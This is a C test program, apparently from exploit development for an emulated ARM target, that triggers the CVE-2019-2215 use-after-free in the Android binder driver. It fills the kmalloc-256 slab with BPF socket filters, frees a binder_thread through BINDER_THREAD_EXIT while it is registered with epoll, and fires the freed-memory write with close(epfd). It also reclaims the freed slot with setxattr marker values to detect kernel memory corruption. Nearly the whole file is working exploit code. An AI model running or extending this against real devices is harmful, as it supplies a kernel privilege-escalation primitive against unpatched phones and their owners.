/*
 * uaf_verify.c — Verify CVE-2019-2215 UAF is actually happening
 * 
 * Minimal test: check slab counts around each operation to verify
 * the binder_thread is actually freed and reclaimed.
 *
 * Build: .\qemu\build-arm.bat src\uaf_verify.c uaf_verify
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/xattr.h>
#include <unistd.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)
#define BC_ENTER_LOOPER         0x630c

struct binder_write_read {
    signed long write_size, write_consumed;
    unsigned long write_buffer;
    signed long read_size, read_consumed;
    unsigned long read_buffer;
};

static long read_slab(const char *cache) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512]; long count = -1;
    if (!f) return -1;
    while (fgets(line, sizeof(line), f))
        if (strncmp(line, cache, strlen(cache)) == 0 && line[strlen(cache)] == ' ')
            { sscanf(line + strlen(cache) + 1, "%ld", &count); break; }
    fclose(f);
    return count;
}

int main(void) {
    printf("=== CVE-2019-2215 UAF Verification ===\n\n");

    /* Pin to CPU 0 */
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(0, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);

    long s0, s1, s2, s3, s4, s5, s6;

    /* ==================== TEST A: Without BC_ENTER_LOOPER ==================== */
    printf("=== TEST A: Without BC_ENTER_LOOPER ===\n");

    /* Fill slab first */
    int spray[200];
    struct sock_filter insns[26];
    for (int j = 0; j < 25; j++) {
        insns[j].code = BPF_LD | BPF_IMM;
        insns[j].jt = 0; insns[j].jf = 0; insns[j].k = 0;
    }
    insns[25].code = BPF_RET | BPF_K;
    insns[25].jt = 0; insns[25].jf = 0; insns[25].k = 0xFFFF;
    struct sock_fprog prog = { .len = 26, .filter = insns };
    for (int j = 0; j < 200; j++) {
        spray[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray[j] >= 0)
            setsockopt(spray[j], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    }

    s0 = read_slab("kmalloc-256");
    printf("  After BPF spray: k256=%ld\n", s0);

    int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    uint32_t mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    s1 = read_slab("kmalloc-256");
    printf("  After open binder: k256=%ld (delta=%+ld)\n", s1, s1-s0);

    int epfd = epoll_create1(O_CLOEXEC);
    struct epoll_event ev = { .events = EPOLLIN };
    int r = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    printf("  epoll_ctl result: %d (errno=%d %s)\n", r, r<0?errno:0, r<0?strerror(errno):"");

    s2 = read_slab("kmalloc-256");
    printf("  After epoll_ctl ADD: k256=%ld (delta=%+ld from spray)\n", s2, s2-s0);

    int thr = 0;
    r = ioctl(bfd, BINDER_THREAD_EXIT, &thr);
    printf("  BINDER_THREAD_EXIT result: %d (errno=%d %s)\n", r, r<0?errno:0, r<0?strerror(errno):"");

    s3 = read_slab("kmalloc-256");
    printf("  After THREAD_EXIT: k256=%ld (delta=%+ld from epoll_ctl)\n", s3, s3-s2);

    /* Now close(epfd) — this should trigger the UAF */
    close(epfd);

    s4 = read_slab("kmalloc-256");
    printf("  After close(epfd): k256=%ld (delta=%+ld from THREAD_EXIT)\n", s4, s4-s3);

    close(bfd);

    s5 = read_slab("kmalloc-256");
    printf("  After close(binder): k256=%ld (delta=%+ld from close_epfd)\n", s5, s5-s4);

    /* Cleanup spray */
    for (int j = 0; j < 200; j++) if (spray[j] >= 0) close(spray[j]);

    s6 = read_slab("kmalloc-256");
    printf("  After cleanup spray: k256=%ld (delta=%+ld from close_binder)\n\n", s6, s6-s5);

    /* ==================== TEST B: WITH BC_ENTER_LOOPER ==================== */
    printf("=== TEST B: With BC_ENTER_LOOPER ===\n");

    /* Re-spray */
    for (int j = 0; j < 200; j++) {
        spray[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray[j] >= 0)
            setsockopt(spray[j], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    }

    s0 = read_slab("kmalloc-256");
    printf("  After BPF spray: k256=%ld\n", s0);

    bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    /* BC_ENTER_LOOPER this time */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (unsigned long)&cmd;
    ioctl(bfd, BINDER_WRITE_READ, &bwr);

    s1 = read_slab("kmalloc-256");
    printf("  After ENTER_LOOPER: k256=%ld (delta=%+ld from spray)\n", s1, s1-s0);

    epfd = epoll_create1(O_CLOEXEC);
    ev.events = EPOLLIN;
    r = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
    printf("  epoll_ctl result: %d\n", r);

    s2 = read_slab("kmalloc-256");
    printf("  After epoll_ctl ADD: k256=%ld (delta=%+ld)\n", s2, s2-s1);

    thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    s3 = read_slab("kmalloc-256");
    printf("  After THREAD_EXIT: k256=%ld (delta=%+ld from epoll_ctl)\n", s3, s3-s2);

    close(epfd);

    s4 = read_slab("kmalloc-256");
    printf("  After close(epfd): k256=%ld (delta=%+ld from THREAD_EXIT)\n", s4, s4-s3);

    close(bfd);
    for (int j = 0; j < 200; j++) if (spray[j] >= 0) close(spray[j]);

    s5 = read_slab("kmalloc-256");
    printf("  After cleanup: k256=%ld\n\n", s5);

    /* ==================== TEST C: Check if thread is freed ==================== */
    printf("=== TEST C: Verify thread creation and free ===\n");

    /* Fresh spray */
    for (int j = 0; j < 200; j++) {
        spray[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray[j] >= 0)
            setsockopt(spray[j], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    }

    s0 = read_slab("kmalloc-256");

    bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    /* Create multiple threads via BINDER_WRITE_READ */
    for (int i = 0; i < 5; i++) {
        struct binder_write_read bwr2;
        memset(&bwr2, 0, sizeof(bwr2));
        uint32_t c = BC_ENTER_LOOPER;
        bwr2.write_size = sizeof(c);
        bwr2.write_buffer = (unsigned long)&c;
        ioctl(bfd, BINDER_WRITE_READ, &bwr2);
    }

    s1 = read_slab("kmalloc-256");
    printf("  After 5x BC_ENTER_LOOPER: delta=%+ld (expect +1 thread)\n", s1-s0);

    /* Thread exit */
    thr = 0;
    for (int i = 0; i < 5; i++)
        ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    s2 = read_slab("kmalloc-256");
    printf("  After 5x THREAD_EXIT: delta=%+ld (expect -1 from enter_looper state)\n", s2-s1);

    close(bfd);
    for (int j = 0; j < 200; j++) if (spray[j] >= 0) close(spray[j]);

    /* ==================== TEST D: Simple write after free ==================== */
    printf("\n=== TEST D: setxattr right after THREAD_EXIT ===\n");

    /* Pre-create file */
    const char *path = "/data/local/tmp/.uaf_test";
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd >= 0) { char c = 'x'; write(fd, &c, 1); close(fd); }

    for (int j = 0; j < 200; j++) {
        spray[j] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (spray[j] >= 0)
            setsockopt(spray[j], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
    }

    s0 = read_slab("kmalloc-256");

    bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    mx = 0;
    ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);

    /* NO BC_ENTER_LOOPER */
    epfd = epoll_create1(O_CLOEXEC);
    ev.events = EPOLLIN;
    epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

    s1 = read_slab("kmalloc-256");
    printf("  After setup: k256=%ld (delta=%+ld)\n", s1, s1-s0);

    thr = 0;
    ioctl(bfd, BINDER_THREAD_EXIT, &thr);

    s2 = read_slab("kmalloc-256");
    printf("  After THREAD_EXIT: delta=%+ld\n", s2-s1);

    /* IMMEDIATELY setxattr to reclaim */
    char val[200];
    memset(val, 'Q', sizeof(val));
    memset(val + 44, 0, 4);
    *(uint32_t*)(val + 48) = 0xDEADBEEF;
    *(uint32_t*)(val + 52) = 0xCAFEBABE;
    setxattr(path, "user.test", val, sizeof(val), XATTR_CREATE);

    s3 = read_slab("kmalloc-256");
    printf("  After setxattr: delta=%+ld (from THREAD_EXIT)\n", s3-s2);

    /* Now close(epfd) — if UAF works, this writes to... what? */
    /* If setxattr buffer was freed (transient), the slot is free again.
     * close(epfd) writes to free memory. */
    /* If the slot was reclaimed by something ELSE, writes go there. */
    close(epfd);

    s4 = read_slab("kmalloc-256");
    printf("  After close(epfd): delta=%+ld\n", s4-s3);

    /* Read back xattr */
    char rbuf[200];
    memset(rbuf, 0, sizeof(rbuf));
    ssize_t rlen = getxattr(path, "user.test", rbuf, sizeof(rbuf));
    printf("  getxattr: len=%zd\n", rlen);
    if (rlen >= 56) {
        uint32_t v48 = *(uint32_t*)(rbuf + 48);
        uint32_t v52 = *(uint32_t*)(rbuf + 52);
        printf("  +48=0x%08x (was 0xDEADBEEF) %s\n", v48,
               v48 == 0xDEADBEEF ? "UNCHANGED" : "CORRUPTED!");
        printf("  +52=0x%08x (was 0xCAFEBABE) %s\n", v52,
               v52 == 0xCAFEBABE ? "UNCHANGED" : "CORRUPTED!");
    }

    unlink(path);
    close(bfd);
    for (int j = 0; j < 200; j++) if (spray[j] >= 0) close(spray[j]);

    printf("\n=== Done ===\n");
    return 0;
}
